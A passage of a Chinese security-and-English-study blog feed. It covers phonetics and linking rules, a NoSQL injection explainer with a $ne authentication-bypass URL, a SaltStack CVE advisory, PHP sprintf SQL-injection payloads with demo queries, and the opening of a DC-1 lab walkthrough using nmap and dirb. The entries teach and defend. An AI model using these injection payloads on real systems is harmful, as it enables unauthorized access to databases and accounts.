<li>[ h ] 字母组合: h<br>单词举例： hot[hɔt] he[hi:] hat[hæt] has[hæz]<br>热的 他 帽子 有<br>浊辅音</li>
<li>[ b ] 字母组合: b<br>单词举例：boy[bɔi] ball[bɔ:l] bed[bed] bag[bæɡ] bee[bi:]<br>男孩 球 床 书包 蜜蜂</li>
<li>[ d ] 字母组合: d<br>单词举例：dog[dɔɡ] do[du:] date[deit] doctor[dɔktə] desk[desk]<br>狗 做 日期 医生 书桌</li>
<li>[ g ]字母组合: g gg<br>单词举例：get[ɡet] glass[ɡlɑ:s] grass[ɡrɑ:s] egg[eɡ] give[ɡiv] bag[bæɡ]<br>变成 眼镜 草 蛋 给 书包</li>
<li>[ r ] 字母组合: r<br>单词举例： red[red] read[ri:d] rain[rein] run[rʌn]<br>红 读 雨 跑</li>
<li>[ v ]字母组合: v<br>单词举例：Very[‘veri] vase[vɑ:z] five[faiv] love[lʌv] wave[weiv] eleven[i’levən]<br>很 花瓶 五 爱 挥手 十一</li>
<li>[ ð ]字母组合: th<br>单词举例： this[ðis] that[ðæt] these[ði:z] those[ðəuz]<br>这 那 这些 那些</li>
<li>[ z ]字母组合: z] s ze se<br>单词举例： zoo[zu: zero[‘ziərəu] these[ði:z] those[ðəuz]<br>动物园 零 这些 那些</li>
<li>[ dz ]字母组合: ds<br>单词举例： beds hands cards bands<br>床 手 牌 乐队</li>
<li>[ dr ]字母组合: dr<br>单词举例： dry[drai] drink[driŋk] dress[dres] driver[draivə] draw[drɔ:]<br>干的 喝 女服 驾驶员 画</li>
<li>[ ʒ ]字母组合: s si(on）<br>单词举例：usually[‘ju:ʒuəli] television[‘teli,viʒən] casual[‘kæʒjuəl] treasure[‘treʒə]<br>通常 电视机 非正式的 财宝</li>
<li>[ dʒ 字母组合: g ge j dge<br>单词举例： orange[‘ɔrindʒ] page[peidʒ] job[dʒɔb] jeep[dʒi:p] jump[dʒʌmp]<br>橙 页 工作 吉普车 跳跃<br>其他辅音</li>
<li>[ m ]字母组合: m<br>单词举例： many[‘meni] meat[mi:t] mother[‘mʌðə] music[‘mju:zik]<br>许多的 肉 妈妈 音乐</li>
<li>[ n ]字母组合: n<br>单词举例： no[nəu] not[nɔt] noodle[‘nu:dl] new[nju:] now[nau]<br>不 不 面条 新的 现在</li>
<li>[ l ]字母组合: l<br>单词举例： look[luk] long[lɔŋ] left [lɛft] light[laɪt] let[let]<br>看 长的 左边的 灯 让</li>
<li>[ ŋ ]字母组合: ng<br>单词举例：long [l ɔ ŋ] sing[siŋ]<br>长的 唱<br>[ j ]字母组合: y<br>单词举例： year[jiə] yellow[‘jeləu] you[ju:] yes[jes]<br>年 黄色 你 是</li>
<li>[ w ]字母组合: w wh<br>单词举例：word[wə:d] winter[‘wintə] window [‘windəu] What where when<br>字 冬天 窗口 什么 在那里 什么时候<br>[ju:]字母组合: u<br>单词举例： Music[‘mju:zik] you[ju:] Tuesday[‘tju:zdei] use [ju:z]<br>音乐 你 星期二 使用</li>
</ol>
<p>辅音<br>[p] pot pig put [b] bed bag book [t] tooth teacher tea [d] dog dig duck<br>[k] cake keep cat [g] grandpa girl green [f] father fat foot [v] five very vent<br>[s] small study bus [z] jazz zoo zero [θ] eighth forth tenth [δ] those these that<br>[∫] cash shoe ship [з] measure pleasure leisure<br>[t∫]chair chicken lunch [dз] jack job change<br>[tr] tree truck train [dr] dress drink drain<br>[ts] students coats cats [dz] beds odds codes<br>[m] mum moon morning [n] moon nut needle [ŋ] ink link ring<br>[h] hello hurry hey [l] look leg lake [r] rain radio room [w] window wake week<br>[j] yellow yes you<br>单元音：<br>[e] yes yellow bed [ae] cat bad dad [a:] are car far [۸] cut nut but<br>[כ] pot got dog [כ:] call tall or [ə:]curtain further fur [ə]mother color cooler<br>[i] ink big pig [i:] jeep tea eat [u] good book look [u:] cool zoo tool<br>双元音：<br>[ei] age eight make [ai] ice bike nice [כi]toy oil boy [əu] old joke gold<br>[au] cloud mouth cow [εə] air fair chair [iə] ear near year [uə] cure dure pure</p>
<img src="https://ckcah.github.io/images/English/1.png"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习英语的漫长历程</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>英语连读规则</title>
    <url>/2020/05/08/%E8%8B%B1%E8%AF%AD%E8%BF%9E%E8%AF%BB%E8%A7%84%E5%88%99/</url>
    <content><![CDATA[<h1 id="1、-以辅音结尾的单词-h开头的单词h不发音，与前面的辅音连读"><a href="#1、-以辅音结尾的单词-h开头的单词h不发音，与前面的辅音连读" class="headerlink" title="1、 以辅音结尾的单词+h开头的单词h不发音，与前面的辅音连读"></a>1、 以辅音结尾的单词+h开头的单词h不发音，与前面的辅音连读</h1><p>　　如：What wil(l he) [wili]do?</p>
<p>　　Ha(s he) done it before?</p>
<p>　　Mus(t he) [ti] go?</p>
<p>　　Tell him to ask her lea(ve him) [vim].</p>
<h1 id="2、以辅音结尾的单词-元音开头的单词"><a href="#2、以辅音结尾的单词-元音开头的单词" class="headerlink" title="2、以辅音结尾的单词+元音开头的单词"></a>2、以辅音结尾的单词+元音开头的单词</h1><p>　　如：(1)I’d li(ke a)nother bow(l o)f rice. 这里like/laik / 以辅音结尾，another 以元音开头，所以连读;</p>
<p>　　(2)We have an English friend. 这个句子有两处连读：前一处是have的尾辅音/v/与an的开头元音//连读为/v/;后一处是an的尾辅音/n/与English的开头音素/i/连读为/ni/</p>
<p>　　注意：以辅音结尾指的是音标中的最后一个音是辅音，而不是单词最后一个字母是辅音字母，这如同u[ju:]niversity前面的定冠词必须用a一样。</p>
<h1 id="3、“辅音-半元音”型连读"><a href="#3、“辅音-半元音”型连读" class="headerlink" title="3、“辅音+半元音”型连读"></a>3、“辅音+半元音”型连读</h1><p>　　英语语音中的/j/和/w/是半元音，如果前一个词是以辅音结尾，后一个词是以半元音，特别是/j/开头，此时也要连读。</p>
<p>　　如：Thank you. Nice to meet you. Did you get there late again?Would you like a cup of tea? Could you help me, please?</p>
<h1 id="4、以-r或-re字母结尾的单词-元音开头的单词时，可将-r-与后面的元音拼读。"><a href="#4、以-r或-re字母结尾的单词-元音开头的单词时，可将-r-与后面的元音拼读。" class="headerlink" title="4、以-r或-re字母结尾的单词+元音开头的单词时，可将/r/与后面的元音拼读。"></a>4、以-r或-re字母结尾的单词+元音开头的单词时，可将/r/与后面的元音拼读。</h1><p>　　如：They looked for it here and there.这个句子也有两处连读：前一处是for it合读为/frit/，后一处是here and合读为/hirænd/。</p>
<p>　　注意：如果一个音节的前后都有字母r，即使后面的词以元音开头，也不能连读。 The black clouds are coming nearer and nearer.(nearer与and不可连读)</p>
<h1 id="5、“元音-元音”型连读"><a href="#5、“元音-元音”型连读" class="headerlink" title="5、“元音+元音”型连读"></a>5、“元音+元音”型连读</h1><p>　　如果前一个词以元音结尾，后一个词以元音开头，这两个音往往也要自然而不间断地连读到一起。</p>
<p>　　如：I am Chinese.</p>
<p>　　He is very friendly to me.</p>
<p>　　She wants to study English.</p>
<p>　　How and why did you come here?</p>
<p>　　She can’t carry it.</p>
<p>　　It’ll take you three hours to walk there.</p>
<p>　　The question is too easy for him to answer.</p>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>连读现象只出现在意群(所谓意群是指句子中按意思和结构划分出的各个部分，每一部分即称为一个意群)内部，意群与意群之间的两个相邻单词即使符合上面所讲的两个条件，也不连读。</p>
<p>　　如：I hope it’ll get a little warmer. 这个句子中的hope it就不连读为/hupit/，因为主句I hope是一个意群，后面的从句是另一个意群。</p>
<p>　　以上就是整理的关于英语句子连读规则，希望对大家有所帮助。英语句子连读规则虽然大家现在都知道了，但是并不代表你们就会句子连读了。英语句子连读不能为了连读而连读，而是建立在别人能够理解的条件上。而且，英语句子连读规则要真正应用到实际，需要大家通过大量的口头练习才能掌握。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习英语的漫长历程</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL注入</title>
    <url>/2020/05/08/NoSQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a><strong>漏洞描述：</strong></h4><p>攻击者伪造一个带有注入代码的Web访问请求，当数据库客户端或协议包装器进行处理时，将会执行预期的非法数据库操作。如下图所示：</p>
<img src="https://ckcah.github.io/images/NoSQL%E6%B3%A8%E5%85%A5/1.png">

<h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a><strong>漏洞成因：</strong></h4><p>NoSQL注入攻击可以在程序语言中执行，而不是在声明式 SQL语言中执行，NoSQL数据库的调用是使用应用程序的编程语言编写的，过滤掉常见的HTML特殊字符，如&lt;&gt;＆;不会阻止针对NoSQL的攻击。</p>
<h4 id="风险评估："><a href="#风险评估：" class="headerlink" title="风险评估："></a><strong>风险评估：</strong></h4><p>在输入URL和表单处，攻击者通过输入精心构造的语句，获取数据库内容，或绕过认证。</p>
<p><strong>漏洞风险等级—-高</strong></p>
<h4 id="测试方法："><a href="#测试方法：" class="headerlink" title="测试方法："></a><strong>测试方法：</strong></h4><p>NoSQL相关的攻击大致分为以下五类：</p>
<p>重言式。又称为永真式。此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。例如，MongoDB注入攻击，用$ne（不相等）操作符, 构造请求<a href="http://www.xxx.com/index.php?username%5B$ne%5D=1&amp;password%5B$ne%5D=1%EF%BC%8C%E7%BB%95%E8%BF%87%E8%AE%A4%E8%AF%81%E8%BF%9B%E5%85%A5%E7%B3%BB%E7%BB%9F%E3%80%82">http://www.xxx.com/index.php?username[$ne]=1&amp;password[$ne]=1，绕过认证进入系统。</a></p>
<p>联合查询。联合查询最常用的用法是绕过认证页面获取数据。通过增加永真的表达式利用布尔OR运算符进行攻击，从而导致整个语句判定出错，进行非法的数据获取。</p>
<p>JavaScript注入。这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改。</p>
<p>背负式查询。在背负式查询中，攻击者通过利用转义特定字符（比如像回车和换行之类的结束符）插入由数据库额外执行的查询，这样就可以执行任意代码了。</p>
<p>跨域违规。HTTP REST APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，攻击者利用合法用户和他们的网页浏览器执行有害的操作。在本文中，我们将展示此类跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上，攻击者可以在目标数据库上执行post动作，从而破坏数据库。</p>
<p>案例详情请参考：<a href="http://www.infoq.com/cn/articles/nosql-injections-analysis%E3%80%82">http://www.infoq.com/cn/articles/nosql-injections-analysis。</a></p>
<h4 id="加固方法"><a href="#加固方法" class="headerlink" title="加固方法"></a><strong>加固方法</strong></h4><p>防止数组中的运算操作即可防御该漏洞。可以使用一下两种方式：</p>
<p>1．采用implode()方法，如下图：</p>
<img src="https://ckcah.github.io/images/NoSQL%E6%B3%A8%E5%85%A5/2.png">

<p>implode()函数返回由数组元素组合成的字符串。这样就只能得到一个对应的结果。</p>
<img src="https://ckcah.github.io/images/NoSQL%E6%B3%A8%E5%85%A5/3.png">

<p>2．使用addslashes()函数，这样攻击者便不能破坏查询语句。同时，也可以用正则表达式把一些特殊符号替换掉，如使用如下正则：</p>
<p>$u_name =preg_replace(‘/[^a-z0-9]/i’, ‘\’, $_GET[‘u_name’]);</p>
<img src="https://ckcah.github.io/images/NoSQL%E6%B3%A8%E5%85%A5/4.png">



<p>转载至<a href="https://mp.weixin.qq.com/s/4t7kEBzpIOMcTiNNWQvrFA">https://mp.weixin.qq.com/s/4t7kEBzpIOMcTiNNWQvrFA</a></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SaltStack安全漏洞（CVE-2020-11651/CVE-2020-11652）</title>
    <url>/2020/05/08/SaltStack%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11651-CVE-2020-11652%EF%BC%89/</url>
    <content><![CDATA[<p><strong>通告编号:NS-2020-0030</strong></p>
<p>2020-05-04</p>
<table>
<thead>
<tr>
<th><strong>TA</strong>G：</th>
<th><strong>SaltStack、目录遍历、认证绕过、任意命令执行、CVE-2020-11651、CVE-2020-11652</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>漏洞危害：</strong></td>
<td><strong>Saltstack为自动化运维工具，应用广泛。此次通告的漏洞可导致身份认证绕过、目录遍历、执行任意命令。</strong></td>
</tr>
<tr>
<td><strong>应急等级：</strong></td>
<td><strong>蓝色</strong></td>
</tr>
<tr>
<td><strong>版本：</strong></td>
<td>**1.0 **</td>
</tr>
</tbody></table>
<p><strong>漏洞概述</strong></p>
<p>SaltStack是一款开源自动化运维工具。具备配置管理、远程执行、监控等功能，运维人员通过部署SaltStack，可在多台服务器上批量执行命令。其具备功能强大，灵活性强的特点，应用广泛。</p>
<p>近日，SaltStack被曝存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652），如下：</p>
<p><strong>CVE-2020-11651（认证绕过漏洞）</strong>：</p>
<p>此漏洞由于Salt Master进程的ClearFuncs类没有正确地验证方法调用而导致。远程攻击者利用此漏洞无需认证即可调用_send_pub（）及_prep_auth_info（）方法。使用这些方法可以在Salt Master端服务器上检索到用户令牌，在Salt Minions端服务器上实现任意命令执行。</p>
<p><strong>CVE-2020-11652（目录遍历漏洞）</strong>：</p>
<p>此漏洞由于Salt Master进程的ClearFuncs类没有对访问路径进行正确过滤而导致，经过身份认证的攻击者利用此漏洞可以访问任意目录。</p>
<p>参考链接：</p>
<p><a href="https://github.com/saltstack/salt/blob/v3000.2_docs/doc/topics/releases/3000.2.rst">https://github.com/saltstack/salt/blob/v3000.2_docs/doc/topics/releases/3000.2.rst</a></p>
<p><a href="https://github.com/saltstack/salt/blob/v2019.2.4_docs/doc/topics/releases/2019.2.4.rst">https://github.com/saltstack/salt/blob/v2019.2.4_docs/doc/topics/releases/2019.2.4.rst</a></p>
<p><strong>影响范围</strong></p>
<p><strong>受影响版本</strong></p>
<ul>
<li>SaltStack &lt; 2019.2.4</li>
<li>SaltStack &lt; 3000.2</li>
</ul>
<p><strong>不受影响版本</strong></p>
<ul>
<li>SaltStack  2019.2.4</li>
<li>SaltStack  3000.2</li>
</ul>
<p>3版本检测</p>
<p>相关用户可通过下列命令查看当前SaltStack版本，以判断是否在受影响范围内。</p>
<p>salt –versions-report</p>
<p>4漏洞防护</p>
<p><strong>4.1 官方升级</strong></p>
<p>1、SaltStack官方已发布最新版本修复此漏洞，建议相关用户及时更新至安全版本及其以上，并开启SaltStack自动更新，以便实时获取补丁或升级至安全版本；</p>
<p><a href="https://repo.saltstack.com/">https://repo.saltstack.com/</a></p>
<p>2、禁止将Salt Master默认监听端口（4505、4506）向公网开放，并设置为仅对可信对象开放。</p>
<p><strong>END</strong></p>
<p>转载至<a href="https://mp.weixin.qq.com/s/CzJS6gpePZe1W14FrEBIEg">https://mp.weixin.qq.com/s/CzJS6gpePZe1W14FrEBIEg</a></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>CVE</category>
        <category>SaltStack</category>
      </categories>
      <tags>
        <tag>目录遍历</tag>
        <tag>认证绕过</tag>
        <tag>任意命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>sprintf字符串格式化漏洞</title>
    <url>/2020/05/08/sprintf%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(sprintf(&quot;1%&#x27;#10s9&quot;,&#x27;monkey&#x27;));</span><br><span class="line">#使用#填充，结果是1####monkey9</span><br><span class="line"></span><br><span class="line">var_dump(sprintf(&quot;1$&#x27;#10s&quot;,&#x27;monkey&#x27;));</span><br><span class="line"># 结果为&#x27;####monkey&#x27;(length=10)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题出在单引号上</p>
<p>Sprintf()函数中**%**1$’[需要填充的字符]10s:</p>
<p>在需要填充的字符前面都要加上一个单引号，’10’代表的字符串总长度为10。</p>
<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql=sprintf(&quot;select * from t where a=&#x27;%\&#x27;&quot;,&#x27;admin&#x27;);</span><br><span class="line">echo $sql;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t where a=&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\也不例外</p>
<p>所以，如果提前将<code>%&#39;and 1 = 1 #&#39;</code>拼接到sql语句里，如果存在sqli过滤，单引号会被转移成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&#x27;select* from user where username = &#x27;%\&#x27; and 1=1#&#x27;;</span><br></pre></td></tr></table></figure>

<p>然后sql语句如果继续进入格式化字符串，\会被%吃掉，则 ‘ 成功逃逸</p>
<p>测试1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql= &quot;select * from user where username = &#x27;%\&#x27; and 1=1#&#x27;;&quot;;</span><br><span class="line">$args= &quot;admin&quot;;</span><br><span class="line">echo sprintf( $sql, $args ) ;</span><br><span class="line">//result:select * from user where username = &#x27;&#x27; and 1=1#&#x27;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;&#x27; and 1=1#&#x27;;</span><br></pre></td></tr></table></figure>



<p>测试2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql= &quot;select * from user where username = &#x27;%1$\&#x27; and 1=1#&#x27; andpassword=&#x27;%s&#x27;;&quot;;</span><br><span class="line">$args= &quot;admin&quot;;</span><br><span class="line">echo sprintf( $sql, $args) ;</span><br><span class="line">//result:select * from user where username = &#x27;&#x27; and 1=1#&#x27; andpassword=&#x27;admin&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;&#x27; and 1=1#&#x27; andpassword=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>



<p>国外的研究人员AnthonyFerrara给出了另一种利用方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input1= &#x27;%1$c) OR 1 = 1 /*&#x27;;</span><br><span class="line">$input2= 39;</span><br><span class="line">$sql= &quot;SELECT * FROM foo WHERE bar IN (&#x27;$input1&#x27;) AND baz = %s&quot;;</span><br><span class="line">$sql= sprintf($sql, $input2);</span><br><span class="line">echo $sql;</span><br></pre></td></tr></table></figure>

<p>%c起到了类似chr()的效果，将数字39转化为单引号’，从而导致了sql注入。</p>
<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM foo WHERE bar IN (&#x27;&#x27;) OR 1 = 1 /*&#x27;) AND baz = 39</span><br></pre></td></tr></table></figure>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>学会残忍是对安全的最大保障</title>
    <url>/2020/05/03/%E5%AD%A6%E4%BC%9A%E6%AE%8B%E5%BF%8D%E6%98%AF%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E4%BF%9D%E9%9A%9C/</url>
    <content><![CDATA[<h1 id="英汉"><a href="#英汉" class="headerlink" title="英汉"></a>英汉</h1><iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV1L4411w7yK?p=1" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>



<h1 id="英"><a href="#英" class="headerlink" title="英"></a>英</h1><iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV1L4411w7yK?p=2" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>





<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
        <category>反省</category>
      </categories>
      <tags>
        <tag>日常阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>如何增加说话的幽默感？</title>
    <url>/2020/05/02/%E5%A6%82%E4%BD%95%E5%A2%9E%E5%8A%A0%E8%AF%B4%E8%AF%9D%E7%9A%84%E5%B9%BD%E9%BB%98%E6%84%9F%EF%BC%9F/</url>
    <content><![CDATA[<h1 id="英汉"><a href="#英汉" class="headerlink" title="英汉"></a>英汉</h1><iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV1qZ4y1s7LE" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>



<h1 id="纯英"><a href="#纯英" class="headerlink" title="纯英"></a>纯英</h1><iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV1qZ4y1s7LE?p=2" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>



<h1 id="youtube"><a href="#youtube" class="headerlink" title="youtube"></a>youtube</h1><div class="video-container"><iframe src="https://www.youtube.com/embed/0dC3jj-mlkE" frameborder="0" loading="lazy" allowfullscreen></iframe></div>



<h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>学不学英语不重要，兄die们一定要找女朋友啊！</p>
<p>别个女生要是问你，“你老了以后想成为什么样的人！”</p>
<p>要是碰上喜欢的女孩子，就告诉她！“想成为你的人！！”（眼神一定要真诚）</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>English</category>
        <category>自我修养</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>DC_1</title>
    <url>/2020/05/02/DC-1/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>由于没有安装virtual Box的原因，所以直接用vm打开的，决定后期安装virtual，将网卡调成NAT模式,然后开启虚拟机，不需要登录（也进不去）</p>
<img src="https://ckcah.github.io/images/DC_1/1.png">

<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>不知道IP地址，但是知道在同一个网段</p>
<h2 id="0x01-nmap扫描一波"><a href="#0x01-nmap扫描一波" class="headerlink" title="0x01 nmap扫描一波"></a>0x01 nmap扫描一波</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">namp -Pn 192.168.114.0/24</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_1/2.png">

<p>总共就开了两个虚拟机，2是kali的地址，理所当然1就是我们的目标IP地址了。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.114.145</span><br></pre></td></tr></table></figure>

<p>-A:    使能系统探测、版本检测、脚本扫描、路由追踪</p>
<p>-T&lt;0-5&gt;:    时间模板，越大速度越快</p>
<p>-p:    指定端口扫描范围</p>
<p>一段时间后·······</p>
<img src="https://ckcah.github.io/images/DC_1/3.png">

<p>主机开启了80、22、还有111端口（nfs共享）</p>
<p>可以看到上边的80端口信息，大概就是，开启了apache2，cms为Durpal 7.</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>然后尝试了一下注册的地方，由于技术有限，所以，嗯，没办法绕过，但是可以知道，是存在admin用户的，但是会过滤or、and等非法字符串防止绕过。</p>
<img src="https://ckcah.github.io/images/DC_1/4.png">

<p>然后尝试注册一个普通用户aaa，嗯，，，这可能是正常步骤</p>
<img src="https://ckcah.github.io/images/DC_1/5.png">

<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>想到反正admin用户是存在的，那就，试试爆破，但应该希望不大</p>
<p>burp抓包看看，发现是明文传输</p>
<img src="https://ckcah.github.io/images/DC_1/6.png">

<p>直接试试吧。。。。好的，果然没结果。再见</p>
<img src="https://ckcah.github.io/images/DC_1/7.png">

<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆破的同时，用kali自带的dirb扫描了一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.114.145/</span><br></pre></td></tr></table></figure>

<p>看到了有admin目录，就尝试访问</p>
<img src="https://ckcah.github.io/images/DC_1/8.png">

<p>再等</p>
<img src="https://ckcah.github.io/images/DC_1/9.png">

<p>再扫估计也扫不出什么来，所以停了。看到了robots.txt打开以后大概是这样</p>
<img src="https://ckcah.github.io/images/DC_1/10.png">



<p>全都是不能访问的文件，所以并没有什么值得利用的。</p>
<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>好的。。。。没办法，只有进kali里面试着搜索一下Durpal相关的漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_1/11.png">

<p>漏洞还是很多的。</p>
<p>我尝试了一下sql注入，不知道为什么失败了。</p>
<img src="https://ckcah.github.io/images/DC_1/12.png">



